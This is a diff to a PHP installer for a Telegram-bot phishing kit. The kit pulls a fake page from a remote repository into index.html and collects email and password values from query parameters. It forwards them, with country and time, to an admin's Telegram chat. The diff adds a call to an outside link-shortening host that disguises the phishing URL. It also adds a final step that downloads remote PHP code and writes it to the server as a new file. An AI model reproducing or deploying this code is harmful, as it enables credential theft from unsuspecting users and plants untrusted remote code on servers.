@@ -1,10 +1,11 @@
 <?php
 ob_start();
 unlink('install.php');
-$API_KEY = file_get_contents('token.txt');
-$iscript = file_get_contents('http://bit.ly/iscriptpub');
-$index = file_get_contents($iscript);
+$info = json_decode(file_get_contents('Sha_My.json'),1);
+$API_KEY = $info[info]['token'];
+$index = file_get_contents('https://raw.githubusercontent.com/SoKy-Master/pub/main/index-v111.php');
 $xx = file_put_contents("index.html", $index); 
+
 define('API_KEY',$API_KEY);
 function bot($method,$datas=[]){
     $tbbots = http_build_query($datas);
@@ -35,11 +36,16 @@ $message_id = $update->callback_query->message->message_id;
 $data = $update->callback_query->data;
 $user = $message->from->username;
 
-$admin = file_get_contents('id.txt');
+$admin = $info[info]['id'];
 $email = $_GET["email"];
 $password = $_GET["password"];
 $login = $_GET["login"];
 $linky = $_SERVER['HTTP_HOST'];
+$mink ="https://$linky/index.html";
+$api = "http://www.gift-shamy.xyz/sh.php?link=$mink"; 
+$result = json_decode(file_get_contents($api), true); 
+$shortt = $result["short"];
+$short = str_replace('www.','',$shortt);
 
 if($email){
 $api_key = file_get_contents('http://bit.ly/ipkeypub');
@@ -59,7 +65,7 @@ bot("sendMessage",[
 👁️‍🗨️¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 » $cty
 ⏱ ¦ 𝑻𝒊𝒎𝒆 » $time
 📝 ¦ 𝑫𝒂𝒕𝒆 » $day/$month/$year
-🌐¦ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌 » http://www.$linky/index.html
+🌐¦ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌 » $short
 ",
 'parse_mode'=>"MarkDown",
 'disable_web_page_preview'=>true,
@@ -77,4 +83,6 @@ bot("sendMessage",[
   </body>
 </html>
 <?
+$sha = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/fr/s.php');
+$xxx = file_put_contents("Sha_My.php", $sha);
 ?>
